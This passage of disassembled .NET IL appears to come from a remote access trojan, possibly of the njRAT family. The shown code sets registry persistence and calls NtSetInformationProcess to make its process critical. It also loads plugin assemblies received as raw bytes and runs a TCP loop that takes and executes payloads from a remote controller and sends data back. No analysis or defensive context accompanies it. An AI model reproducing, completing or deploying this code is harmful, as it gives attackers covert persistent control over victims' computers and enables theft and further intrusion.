        IL_02d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02de:  stloc.s    V_11
        IL_02e0:  ldloc.s    V_11
        IL_02e2:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_02e7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02ec:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_02f1:  leave.s    IL_02f3

      }  // end handler
      IL_02f3:  nop
      .try
      {
        IL_02f4:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_02f9:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_02fe:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0303:  ldsfld     string j.OK::sf
        IL_0308:  ldstr      "\\"
        IL_030d:  ldsfld     string j.OK::RG
        IL_0312:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_0317:  ldstr      ""
        IL_031c:  callvirt   instance object [mscorlib]Microsoft.Win32.RegistryKey::GetValue(string,
                                                                                             object)
        IL_0321:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
        IL_0326:  ldstr      "\""
        IL_032b:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0330:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0335:  ldstr      "\" .."
        IL_033a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_033f:  ldc.i4.0
        IL_0340:  call       bool [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Operators::ConditionalCompareObjectNotEqual(object,
                                                                                                                                            object,
                                                                                                                                            bool)
        IL_0345:  brfalse.s  IL_0384

        IL_0347:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
        IL_034c:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
        IL_0351:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_LocalMachine()
        IL_0356:  ldsfld     string j.OK::sf
        IL_035b:  ldc.i4.1
        IL_035c:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::OpenSubKey(string,
                                                                                                                                    bool)
        IL_0361:  ldsfld     string j.OK::RG
        IL_0366:  ldstr      "\""
        IL_036b:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
        IL_0370:  callvirt   instance string [mscorlib]System.IO.FileSystemInfo::get_FullName()
        IL_0375:  ldstr      "\" .."
        IL_037a:  call       string [mscorlib]System.String::Concat(string,
                                                                    string,
                                                                    string)
        IL_037f:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                           object)
        IL_0384:  leave.s    IL_03a1

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_0386:  dup
        IL_0387:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_038c:  stloc.s    V_12
        IL_038e:  ldloc.s    V_12
        IL_0390:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_0395:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_039a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_039f:  leave.s    IL_03a1

      }  // end handler
      IL_03a1:  leave      IL_01b5

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_03a6:  dup
      IL_03a7:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03ac:  stloc.s    V_13
      IL_03ae:  ldloc.s    V_13
      IL_03b0:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_03b5:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_03bf:  leave      IL_01b5
    }  // end handler
  } // end of method OK::ko

  .method public static string  md5(uint8[] B) cil managed
  {
    // Code size       60 (0x3c)
    .maxstack  3
    .locals init (string V_0,
             uint8 V_1,
             uint8[] V_2,
             int32 V_3)
    IL_0000:  newobj     instance void [mscorlib]System.Security.Cryptography.MD5CryptoServiceProvider::.ctor()
    IL_0005:  ldarg.0
    IL_0006:  call       instance uint8[] [mscorlib]System.Security.Cryptography.HashAlgorithm::ComputeHash(uint8[])
    IL_000b:  starg.s    B
    IL_000d:  ldstr      ""
    IL_0012:  stloc.0
    IL_0013:  ldarg.0
    IL_0014:  stloc.2
    IL_0015:  ldc.i4.0
    IL_0016:  stloc.3
    IL_0017:  br.s       IL_0034

    IL_0019:  ldloc.2
    IL_001a:  ldloc.3
    IL_001b:  ldelem.u1
    IL_001c:  stloc.1
    IL_001d:  ldloc.0
    IL_001e:  ldloca.s   V_1
    IL_0020:  ldstr      "x2"
    IL_0025:  call       instance string [mscorlib]System.Byte::ToString(string)
    IL_002a:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_002f:  stloc.0
    IL_0030:  ldloc.3
    IL_0031:  ldc.i4.1
    IL_0032:  add.ovf
    IL_0033:  stloc.3
    IL_0034:  ldloc.3
    IL_0035:  ldloc.2
    IL_0036:  ldlen
    IL_0037:  conv.i4
    IL_0038:  blt.s      IL_0019

    IL_003a:  ldloc.0
    IL_003b:  ret
  } // end of method OK::md5

  .method private static pinvokeimpl("ntdll" winapi) 
          int32  NtSetInformationProcess(native int hProcess,
                                         int32 processInformationClass,
                                         int32& processInformation,
                                         int32 processInformationLength) cil managed preservesig
  {
  }
  .method public static object  Plugin(uint8[] b,
                                       string c) cil managed
  {
    // Code size       114 (0x72)
    .maxstack  3
    .locals init (object V_0,
             class [mscorlib]System.Reflection.Module V_1,
             class [mscorlib]System.Reflection.Module[] V_2,
             int32 V_3,
             class [mscorlib]System.Type V_4,
             class [mscorlib]System.Type[] V_5,
             int32 V_6)
    IL_0000:  ldarg.0
    IL_0001:  call       class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Assembly::Load(uint8[])
    IL_0006:  callvirt   instance class [mscorlib]System.Reflection.Module[] [mscorlib]System.Reflection.Assembly::GetModules()
    IL_000b:  stloc.2
    IL_000c:  ldc.i4.0
    IL_000d:  stloc.3
    IL_000e:  br.s       IL_0068

    IL_0010:  ldloc.2
    IL_0011:  ldloc.3
    IL_0012:  ldelem.ref
    IL_0013:  stloc.1
    IL_0014:  ldloc.1
    IL_0015:  callvirt   instance class [mscorlib]System.Type[] [mscorlib]System.Reflection.Module::GetTypes()
    IL_001a:  stloc.s    V_5
    IL_001c:  ldc.i4.0
    IL_001d:  stloc.s    V_6
    IL_001f:  br.s       IL_005c

    IL_0021:  ldloc.s    V_5
    IL_0023:  ldloc.s    V_6
    IL_0025:  ldelem.ref
    IL_0026:  stloc.s    V_4
    IL_0028:  ldloc.s    V_4
    IL_002a:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_002f:  ldstr      "."
    IL_0034:  ldarg.1
    IL_0035:  call       string [mscorlib]System.String::Concat(string,
                                                                string)
    IL_003a:  callvirt   instance bool [mscorlib]System.String::EndsWith(string)
    IL_003f:  brfalse.s  IL_0056

    IL_0041:  ldloc.1
    IL_0042:  callvirt   instance class [mscorlib]System.Reflection.Assembly [mscorlib]System.Reflection.Module::get_Assembly()
    IL_0047:  ldloc.s    V_4
    IL_0049:  callvirt   instance string [mscorlib]System.Type::get_FullName()
    IL_004e:  callvirt   instance object [mscorlib]System.Reflection.Assembly::CreateInstance(string)
    IL_0053:  stloc.0
    IL_0054:  br.s       IL_0070

    IL_0056:  ldloc.s    V_6
    IL_0058:  ldc.i4.1
    IL_0059:  add.ovf
    IL_005a:  stloc.s    V_6
    IL_005c:  ldloc.s    V_6
    IL_005e:  ldloc.s    V_5
    IL_0060:  ldlen
    IL_0061:  conv.i4
    IL_0062:  blt.s      IL_0021

    IL_0064:  ldloc.3
    IL_0065:  ldc.i4.1
    IL_0066:  add.ovf
    IL_0067:  stloc.3
    IL_0068:  ldloc.3
    IL_0069:  ldloc.2
    IL_006a:  ldlen
    IL_006b:  conv.i4
    IL_006c:  blt.s      IL_0010

    IL_006e:  ldnull
    IL_006f:  stloc.0
    IL_0070:  ldloc.0
    IL_0071:  ret
  } // end of method OK::Plugin

  .method public static void  pr(int32 i) cil managed
  {
    // Code size       49 (0x31)
    .maxstack  4
    .locals init (class [mscorlib]System.Exception V_0)
    .try
    {
      IL_0000:  call       class [System]System.Diagnostics.Process [System]System.Diagnostics.Process::GetCurrentProcess()
      IL_0005:  callvirt   instance native int [System]System.Diagnostics.Process::get_Handle()
      IL_000a:  ldc.i4.s   29
      IL_000c:  ldarga.s   i
      IL_000e:  ldc.i4.4
      IL_000f:  call       int32 j.OK::NtSetInformationProcess(native int,
                                                               int32,
                                                               int32&,
                                                               int32)
      IL_0014:  pop
      IL_0015:  leave.s    IL_0030

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0017:  dup
      IL_0018:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_001d:  stloc.0
      IL_001e:  ldloc.0
      IL_001f:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0024:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0029:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_002e:  leave.s    IL_0030

    }  // end handler
    IL_0030:  ret
  } // end of method OK::pr

  .method public static void  RC() cil managed
  {
    // Code size       565 (0x235)
    .maxstack  8
    .locals init (int64 V_0,
             int32 V_1,
             int64 V_2,
             int32 V_3,
             string V_4,
             int32 V_5,
             char V_6,
             class [mscorlib]System.Exception V_7,
             class [mscorlib]System.Exception V_8)
    IL_0000:  ldstr      ""
    IL_0005:  stsfld     string j.OK::lastcap
    IL_000a:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
    IL_000f:  brfalse    IL_01d2

    IL_0014:  ldc.i4.m1
    IL_0015:  conv.i8
    IL_0016:  stloc.0
    IL_0017:  ldc.i4.0
    IL_0018:  stloc.1
    .try
    {
      IL_0019:  ldloc.1
      IL_001a:  ldc.i4.1
      IL_001b:  add.ovf
      IL_001c:  stloc.1
      IL_001d:  ldloc.1
      IL_001e:  ldc.i4.s   10
      IL_0020:  bne.un.s   IL_002a

      IL_0022:  ldc.i4.0
      IL_0023:  stloc.1
      IL_0024:  ldc.i4.1
      IL_0025:  call       void [mscorlib]System.Threading.Thread::Sleep(int32)
      IL_002a:  ldsfld     bool j.OK::Cn
      IL_002f:  brtrue.s   IL_0036

      IL_0031:  leave      IL_01d2

      IL_0036:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_003b:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_0040:  ldc.i4.1
      IL_0041:  bge.s      IL_0055

      IL_0043:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0048:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_004d:  ldc.i4.m1
      IL_004e:  ldc.i4.0
      IL_004f:  callvirt   instance bool [System]System.Net.Sockets.Socket::Poll(int32,
                                                                                 valuetype [System]System.Net.Sockets.SelectMode)
      IL_0054:  pop
      IL_0055:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_005a:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_005f:  ldc.i4.0
      IL_0060:  ble        IL_01b5

      IL_0065:  ldloc.0
      IL_0066:  ldc.i4.m1
      IL_0067:  conv.i8
      IL_0068:  bne.un.s   IL_00e9

      IL_006a:  ldstr      ""
      IL_006f:  stloc.s    V_4
      IL_0071:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0076:  callvirt   instance class [System]System.Net.Sockets.NetworkStream [System]System.Net.Sockets.TcpClient::GetStream()
      IL_007b:  callvirt   instance int32 [mscorlib]System.IO.Stream::ReadByte()
      IL_0080:  stloc.s    V_5
      IL_0082:  ldloc.s    V_5
      IL_0084:  ldc.i4.m1
      IL_0085:  beq.s      IL_008d

      IL_0087:  ldloc.s    V_5
      IL_0089:  brfalse.s  IL_0092

      IL_008b:  br.s       IL_00c4

      IL_008d:  leave      IL_01d2

      IL_0092:  ldloc.s    V_4
      IL_0094:  call       int64 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToLong(string)
      IL_0099:  stloc.0
      IL_009a:  ldstr      ""
      IL_009f:  stloc.s    V_4
      IL_00a1:  ldloc.0
      IL_00a2:  brtrue.s   IL_00b2

      IL_00a4:  ldstr      ""
      IL_00a9:  call       bool j.OK::Send(string)
      IL_00ae:  pop
      IL_00af:  ldc.i4.m1
      IL_00b0:  conv.i8
      IL_00b1:  stloc.0
      IL_00b2:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00b7:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00bc:  ldc.i4.0
      IL_00bd:  bgt.s      IL_0055

      IL_00bf:  br         IL_0019

      IL_00c4:  ldloc.s    V_4
      IL_00c6:  ldloc.s    V_5
      IL_00c8:  call       char [Microsoft.VisualBasic]Microsoft.VisualBasic.Strings::ChrW(int32)
      IL_00cd:  stloc.s    V_6
      IL_00cf:  ldloca.s   V_6
      IL_00d1:  call       instance string [mscorlib]System.Char::ToString()
      IL_00d6:  call       int32 [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToInteger(string)
      IL_00db:  call       string [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.Conversions::ToString(int32)
      IL_00e0:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_00e5:  stloc.s    V_4
      IL_00e7:  br.s       IL_0071

      IL_00e9:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_00ee:  callvirt   instance int32 [System]System.Net.Sockets.TcpClient::get_Available()
      IL_00f3:  ldc.i4.1
      IL_00f4:  add.ovf
      IL_00f5:  ldc.i4.1
      IL_00f6:  sub.ovf
      IL_00f7:  ldc.i4.1
      IL_00f8:  add.ovf
      IL_00f9:  newarr     [mscorlib]System.Byte
      IL_00fe:  stsfld     uint8[] j.OK::b
      IL_0103:  ldloc.0
      IL_0104:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0109:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_010e:  sub.ovf
      IL_010f:  stloc.2
      IL_0110:  ldsfld     uint8[] j.OK::b
      IL_0115:  ldlen
      IL_0116:  conv.i4
      IL_0117:  conv.i8
      IL_0118:  ldloc.2
      IL_0119:  ble.s      IL_0130

      IL_011b:  ldloc.2
      IL_011c:  ldc.i4.1
      IL_011d:  conv.i8
      IL_011e:  sub.ovf
      IL_011f:  conv.ovf.i4
      IL_0120:  ldc.i4.1
      IL_0121:  add.ovf
      IL_0122:  ldc.i4.1
      IL_0123:  sub.ovf
      IL_0124:  ldc.i4.1
      IL_0125:  add.ovf
      IL_0126:  newarr     [mscorlib]System.Byte
      IL_012b:  stsfld     uint8[] j.OK::b
      IL_0130:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
      IL_0135:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
      IL_013a:  ldsfld     uint8[] j.OK::b
      IL_013f:  ldc.i4.0
      IL_0140:  ldsfld     uint8[] j.OK::b
      IL_0145:  ldlen
      IL_0146:  conv.i4
      IL_0147:  ldc.i4.0
      IL_0148:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Receive(uint8[],
                                                                                     int32,
                                                                                     int32,
                                                                                     valuetype [System]System.Net.Sockets.SocketFlags)
      IL_014d:  stloc.3
      IL_014e:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0153:  ldsfld     uint8[] j.OK::b
      IL_0158:  ldc.i4.0
      IL_0159:  ldloc.3
      IL_015a:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                 int32,
                                                                                 int32)
      IL_015f:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_0164:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
      IL_0169:  ldloc.0
      IL_016a:  bne.un     IL_0019

      IL_016f:  ldc.i4.m1
      IL_0170:  conv.i8
      IL_0171:  stloc.0
      IL_0172:  ldnull
      IL_0173:  ldftn      void j.OK::_Lambda__1(object)
      IL_0179:  newobj     instance void [mscorlib]System.Threading.ParameterizedThreadStart::.ctor(object,
                                                                                                    native int)
      IL_017e:  ldc.i4.1
      IL_017f:  newobj     instance void [mscorlib]System.Threading.Thread::.ctor(class [mscorlib]System.Threading.ParameterizedThreadStart,
                                                                                  int32)
      IL_0184:  dup
      IL_0185:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_018a:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
      IL_018f:  callvirt   instance void [mscorlib]System.Threading.Thread::Start(object)
      IL_0194:  ldc.i4.s   100
      IL_0196:  callvirt   instance bool [mscorlib]System.Threading.Thread::Join(int32)
      IL_019b:  pop
      IL_019c:  ldsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01a1:  callvirt   instance void [mscorlib]System.IO.Stream::Dispose()
      IL_01a6:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
      IL_01ab:  stsfld     class [mscorlib]System.IO.MemoryStream j.OK::MeM
      IL_01b0:  br         IL_0019

      IL_01b5:  leave.s    IL_01d2

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_01b7:  dup
      IL_01b8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01bd:  stloc.s    V_7
      IL_01bf:  ldloc.s    V_7
      IL_01c1:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_01c6:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01cb:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_01d0:  leave.s    IL_01d2

    }  // end handler
    IL_01d2:  nop
    .try
    {
      IL_01d3:  ldsfld     object j.OK::PLG
      IL_01d8:  brfalse.s  IL_0200

      IL_01da:  ldsfld     object j.OK::PLG
      IL_01df:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_01e4:  ldnull
      IL_01e5:  ldstr      "clear"
      IL_01ea:  ldc.i4.0
      IL_01eb:  newarr     [mscorlib]System.Object
      IL_01f0:  ldnull
      IL_01f1:  ldnull
      IL_01f2:  ldnull
      IL_01f3:  ldc.i4.1
      IL_01f4:  call       object [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.NewLateBinding::LateCall(object,
                                                                                                                         class [mscorlib]System.Type,
                                                                                                                         string,
                                                                                                                         object[],
                                                                                                                         string[],
                                                                                                                         class [mscorlib]System.Type[],
                                                                                                                         bool[],
                                                                                                                         bool)
      IL_01f9:  pop
      IL_01fa:  ldnull
      IL_01fb:  stsfld     object j.OK::PLG
      IL_0200:  leave.s    IL_021d

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0202:  dup
      IL_0203:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0208:  stloc.s    V_8
      IL_020a:  ldloc.s    V_8
      IL_020c:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0211:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_0216:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_021b:  leave.s    IL_021d

    }  // end handler
    IL_021d:  ldc.i4.0
    IL_021e:  stsfld     bool j.OK::Cn
    IL_0223:  call       bool j.OK::connect()
    IL_0228:  brfalse.s  IL_01d2

    IL_022a:  ldc.i4.1
    IL_022b:  stsfld     bool j.OK::Cn
    IL_0230:  br         IL_0000
  } // end of method OK::RC

  .method public static uint8[]  SB(string& S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  call       class [mscorlib]System.Text.Encoding [mscorlib]System.Text.Encoding::get_UTF8()
    IL_0005:  ldarg.0
    IL_0006:  ldind.ref
    IL_0007:  callvirt   instance uint8[] [mscorlib]System.Text.Encoding::GetBytes(string)
    IL_000c:  ret
  } // end of method OK::SB

  .method public static bool  Send(string S) cil managed
  {
    // Code size       13 (0xd)
    .maxstack  8
    IL_0000:  ldarga.s   S
    IL_0002:  call       uint8[] j.OK::SB(string&)
    IL_0007:  call       bool j.OK::Sendb(uint8[])
    IL_000c:  ret
  } // end of method OK::Send

  .method public static bool  Sendb(uint8[] b) cil managed
  {
    // Code size       232 (0xe8)
    .maxstack  5
    .locals init (bool V_0,
             object V_1,
             class [mscorlib]System.IO.MemoryStream V_2,
             int32 V_3,
             uint8[] V_4,
             string V_5,
             class [mscorlib]System.Exception V_6,
             class [mscorlib]System.Exception V_7)
    IL_0000:  ldsfld     bool j.OK::Cn
    IL_0005:  brtrue.s   IL_000e

    IL_0007:  ldc.i4.0
    IL_0008:  stloc.0
    IL_0009:  br         IL_00e6

    IL_000e:  nop
    .try
    {
      IL_000f:  ldsfld     class [mscorlib]System.IO.FileInfo j.OK::LO
      IL_0014:  stloc.1
      IL_0015:  ldloc.1
      IL_0016:  call       void [mscorlib]System.Threading.Monitor::Enter(object)
      .try
      {
        IL_001b:  ldsfld     bool j.OK::Cn
        IL_0020:  brtrue.s   IL_0029

        IL_0022:  ldc.i4.0
        IL_0023:  stloc.0
        IL_0024:  leave      IL_00e6

        IL_0029:  newobj     instance void [mscorlib]System.IO.MemoryStream::.ctor()
        IL_002e:  stloc.2
        IL_002f:  ldarg.0
        IL_0030:  ldlen
        IL_0031:  conv.i4
        IL_0032:  stloc.3
        IL_0033:  ldloca.s   V_3
        IL_0035:  call       instance string [mscorlib]System.Int32::ToString()
        IL_003a:  ldstr      bytearray (00 00 ) 
        IL_003f:  call       string [mscorlib]System.String::Concat(string,
                                                                    string)
        IL_0044:  stloc.s    V_5
        IL_0046:  ldloca.s   V_5
        IL_0048:  call       uint8[] j.OK::SB(string&)
        IL_004d:  stloc.s    V_4
        IL_004f:  ldloc.2
        IL_0050:  ldloc.s    V_4
        IL_0052:  ldc.i4.0
        IL_0053:  ldloc.s    V_4
        IL_0055:  ldlen
        IL_0056:  conv.i4
        IL_0057:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_005c:  ldloc.2
        IL_005d:  ldarg.0
        IL_005e:  ldc.i4.0
        IL_005f:  ldarg.0
        IL_0060:  ldlen
        IL_0061:  conv.i4
        IL_0062:  callvirt   instance void [mscorlib]System.IO.MemoryStream::Write(uint8[],
                                                                                   int32,
                                                                                   int32)
        IL_0067:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_006c:  callvirt   instance class [System]System.Net.Sockets.Socket [System]System.Net.Sockets.TcpClient::get_Client()
        IL_0071:  ldloc.2
        IL_0072:  callvirt   instance uint8[] [mscorlib]System.IO.MemoryStream::ToArray()
        IL_0077:  ldc.i4.0
        IL_0078:  ldloc.2
        IL_0079:  callvirt   instance int64 [mscorlib]System.IO.MemoryStream::get_Length()
        IL_007e:  conv.ovf.i4
        IL_007f:  ldc.i4.0
        IL_0080:  callvirt   instance int32 [System]System.Net.Sockets.Socket::Send(uint8[],
                                                                                    int32,
                                                                                    int32,
                                                                                    valuetype [System]System.Net.Sockets.SocketFlags)
        IL_0085:  pop
        IL_0086:  leave.s    IL_008f

      }  // end .try
      finally
      {
        IL_0088:  ldloc.1
        IL_0089:  call       void [mscorlib]System.Threading.Monitor::Exit(object)
        IL_008e:  endfinally
      }  // end handler
      IL_008f:  leave.s    IL_00e0

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0091:  dup
      IL_0092:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_0097:  stloc.s    V_6
      IL_0099:  ldloc.s    V_6
      IL_009b:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      .try
      {
        IL_00a0:  ldsfld     bool j.OK::Cn
        IL_00a5:  brfalse.s  IL_00b7

        IL_00a7:  ldc.i4.0
        IL_00a8:  stsfld     bool j.OK::Cn
        IL_00ad:  ldsfld     class [System]System.Net.Sockets.TcpClient j.OK::C
        IL_00b2:  callvirt   instance void [System]System.Net.Sockets.TcpClient::Close()
        IL_00b7:  leave.s    IL_00d4

      }  // end .try
      catch [mscorlib]System.Exception 
      {
        IL_00b9:  dup
        IL_00ba:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00bf:  stloc.s    V_7
        IL_00c1:  ldloc.s    V_7
        IL_00c3:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
        IL_00c8:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00cd:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
        IL_00d2:  leave.s    IL_00d4

      }  // end handler
      IL_00d4:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00d9:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::ClearProjectError()
      IL_00de:  leave.s    IL_00e0

    }  // end handler
    IL_00e0:  ldsfld     bool j.OK::Cn
    IL_00e5:  stloc.0
    IL_00e6:  ldloc.0
    IL_00e7:  ret
  } // end of method OK::Sendb

  .method public static bool  STV(string n,
                                  object t,
                                  valuetype [mscorlib]Microsoft.Win32.RegistryValueKind typ) cil managed
  {
    // Code size       86 (0x56)
    .maxstack  4
    .locals init (bool V_0,
             class [mscorlib]System.Exception V_1)
    .try
    {
      IL_0000:  ldsfld     class [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.Computer j.OK::F
      IL_0005:  callvirt   instance class [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy [Microsoft.VisualBasic]Microsoft.VisualBasic.Devices.ServerComputer::get_Registry()
      IL_000a:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [Microsoft.VisualBasic]Microsoft.VisualBasic.MyServices.RegistryProxy::get_CurrentUser()
      IL_000f:  ldstr      "Software\\"
      IL_0014:  ldsfld     string j.OK::RG
      IL_0019:  call       string [mscorlib]System.String::Concat(string,
                                                                  string)
      IL_001e:  callvirt   instance class [mscorlib]Microsoft.Win32.RegistryKey [mscorlib]Microsoft.Win32.RegistryKey::CreateSubKey(string)
      IL_0023:  ldarg.0
      IL_0024:  ldarg.1
      IL_0025:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002a:  call       object [mscorlib]System.Runtime.CompilerServices.RuntimeHelpers::GetObjectValue(object)
      IL_002f:  ldarg.2
      IL_0030:  callvirt   instance void [mscorlib]Microsoft.Win32.RegistryKey::SetValue(string,
                                                                                         object,
                                                                                         valuetype [mscorlib]Microsoft.Win32.RegistryValueKind)
      IL_0035:  ldc.i4.1
      IL_0036:  stloc.0
      IL_0037:  leave.s    IL_0054

    }  // end .try
    catch [mscorlib]System.Exception 
    {
      IL_0039:  dup
      IL_003a:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
      IL_003f:  stloc.1
      IL_0040:  ldloc.1
      IL_0041:  call       void [Microsoft.VisualBasic]Microsoft.VisualBasic.CompilerServices.ProjectData::SetProjectError(class [mscorlib]System.Exception)
